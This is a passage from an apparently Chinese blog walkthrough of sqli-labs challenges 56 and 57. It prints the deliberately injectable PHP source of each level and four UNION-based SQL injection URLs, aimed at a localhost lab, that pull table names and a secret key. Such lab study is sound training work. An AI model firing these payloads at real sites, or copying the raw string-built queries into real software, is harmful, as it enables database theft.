class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-56</span>:Challenge<span class="number">-3</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style =<span class="string">"text-align:right"</span>&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input  type=<span class="string">"submit"</span> name=<span class="string">"reset"</span> value=<span class="string">"Reset the Challenge!"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/right&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:20px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/sql-connect-1.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/functions.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$pag = $_SERVER[<span class="string">'PHP_SELF'</span>]; <span class="comment">//generating page address to piggy back after redirects...</span></span><br><span class="line">$characters = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>; <span class="comment">//characterset for generating random data</span></span><br><span class="line">$times= <span class="number">14</span>;</span><br><span class="line"></span><br><span class="line">$table = table_name();</span><br><span class="line">$col = column_name(<span class="number">1</span>);     <span class="comment">// session id column name</span></span><br><span class="line">$col1 = column_name(<span class="number">2</span>);   <span class="comment">//secret key column name</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Submitting the final answer</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'answer_key'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// resetting the challenge and repopulating the table .</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'reset'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Redirecting you to main challenge page..........\n"</span>;</span><br><span class="line">header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line"><span class="comment">//echo "cookie expired";</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Checking the cookie on the page and populate the table with random value.</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'challenge'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$sessid=$_COOKIE[<span class="string">'challenge'</span>];</span><br><span class="line"><span class="comment">//echo "Cookie value: ".$sessid;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$expire = time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;</span><br><span class="line">$hash = data($table,$col);</span><br><span class="line">setcookie(<span class="string">"challenge"</span>, $hash, $expire);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//update the counter in database</span></span><br><span class="line">next_tryy();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Display attempts on screen.</span></span><br><span class="line">$tryyy = view_attempts();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"You have made : "</span>. $tryyy .<span class="string">" of $times attempts"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Reset the Database if you exceed allowed attempts.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($tryyy &gt;=($times+<span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line">setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Redirecting you to challenge page..........\n"</span>;</span><br><span class="line">header( <span class="string">"refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#00FFFF"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font color='#00FFFF': size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;('CHALLENGES')&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;"</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-56.jpg"</span> /&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;div  style=<span class="string">" color:#00FFFF; font-size:18px; text-align:center"</span>&gt;</span><br><span class="line">&lt;form name=<span class="string">"input"</span> action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">Submit Secret Key: &lt;input type=<span class="string">"text"</span> name=<span class="string">"key"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name = <span class="string">"answer_key"</span> value=<span class="string">"Submit"</span>&gt;</span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;div  style=" color:#00FFFF; font-size:18px; text-align:center"&gt;'</span>;</span><br><span class="line">$key = addslashes($_POST[<span class="string">'key'</span>]);</span><br><span class="line">$key = mysql_real_escape_string($key);</span><br><span class="line"><span class="comment">//echo $key;</span></span><br><span class="line"><span class="comment">//Query table to verify your result</span></span><br><span class="line">$sql=<span class="string">"SELECT 1 FROM $table WHERE $col1= '$key'"</span>;</span><br><span class="line"><span class="comment">//echo "$sql";</span></span><br><span class="line">$result=mysql_query($sql)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error in submittion of Key Solution"</span>.mysql_error());</span><br><span class="line"> </span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/Less-54-1.jpg" /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>; </span><br><span class="line">header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap1.jpg" /&gt;'</span>;</span><br><span class="line">header( <span class="string">"refresh:3;url=index.php"</span> );</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>要求还是没变，要求在指定次数内注入出key，只是查询语句的闭合方式变了，其他不变,，根据代码给出的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-56/index.php?id=0%27)%20union%20select%201,2,3%20--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-56/index.php?id=0%27)%20union%20select%201,database(),3%20--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-56/index.php?id=0%27)%20union%20select%201,table_name,3%20from%20information_schema.tables%20where%20table_schema=%22challenges%22%20--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-56/index.php?id=0%27)%20union%20select%201,(select%20`3`%20from%20(select%201,2,3,4%20union%20select%20*%20from%20xtdqbkon6c)a%20limit%201,1),3%20--+</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/17/ksv0Wq.md.png" alt="ksv0Wq.md.png"></p><p><b>57关</b><br>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-57</span>:Challenge<span class="number">-4</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style =<span class="string">"text-align:right"</span>&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input  type=<span class="string">"submit"</span> name=<span class="string">"reset"</span> value=<span class="string">"Reset the Challenge!"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/right&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:20px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/sql-connect-1.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/functions.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$pag = $_SERVER[<span class="string">'PHP_SELF'</span>]; <span class="comment">//generating page address to piggy back after redirects...</span></span><br><span class="line">$characters = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>; <span class="comment">//characterset for generating random data</span></span><br><span class="line">$times= <span class="number">14</span>;</span><br><span class="line"></span><br><span class="line">$table = table_name();</span><br><span class="line">$col = column_name(<span class="number">1</span>);     <span class="comment">// session id column name</span></span><br><span class="line">$col1 = column_name(<span class="number">2</span>);   <span class="comment">//secret key column name</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Submitting the final answer</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'answer_key'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// resetting the challenge and repopulating the table .</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'reset'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Redirecting you to main challenge page..........\n"</span>;</span><br><span class="line">header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line"><span class="comment">//echo "cookie expired";</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Checking the cookie on the page and populate the table with random value.</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'challenge'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$sessid=$_COOKIE[<span class="string">'challenge'</span>];</span><br><span class="line"><span class="comment">//echo "Cookie value: ".$sessid;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$expire = time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;</span><br><span class="line">$hash = data($table,$col);</span><br><span class="line">setcookie(<span class="string">"challenge"</span>, $hash, $expire);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//update the counter in database</span></span><br><span class="line">next_tryy();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Display attempts on screen.</span></span><br><span class="line">$tryyy = view_attempts();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"You have made : "</span>. $tryyy .<span class="string">" of $times attempts"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Reset the Database if you exceed allowed attempts.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($tryyy &gt;=($times+<span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line">setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Redirecting you to challenge page..........\n"</span>;</span><br><span class="line">header( <span class="string">"refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$id= <span class="string">'"'</span>.$id.<span class="string">'"'</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#00FFFF"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font color='#00FFFF': size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;('CHALLENGES')&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;"</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-57.jpg"</span> /&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;div  style=<span class="string">" color:#00FFFF; font-size:18px; text-align:center"</span>&gt;</span><br><span class="line">&lt;form name=<span class="string">"input"</span> action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">Submit Secret Key: &lt;input type=<span class="string">"text"</span> name=<span class="string">"key"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name = <span class="string">"answer_key"</span> value=<span class="string">"Submit"</span>&gt;</span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;div  style=" color:#00FFFF; font-size:18px; text-align:center"&gt;'</span>;</span><br><span class="line">$key = addslashes($_POST[<span class="string">'key'</span>]);</span><br><span class="line">$key = mysql_real_escape_string($key);</span><br><span class="line"><span class="comment">//echo $key;</span></span><br><span class="line"><span class="comment">//Query table to verify your result</span></span><br><span class="line">$sql=<span class="string">"SELECT 1 FROM $table WHERE $col1= '$key'"</span>;</span><br><span class="line"><span class="comment">//echo "$sql";</span></span><br><span class="line">$result=mysql_query($sql)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error in submittion of Key Solution"</span>.mysql_error());</span><br><span class="line"> </span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/Less-54-1.jpg" /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>; </span><br><span class="line">header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span 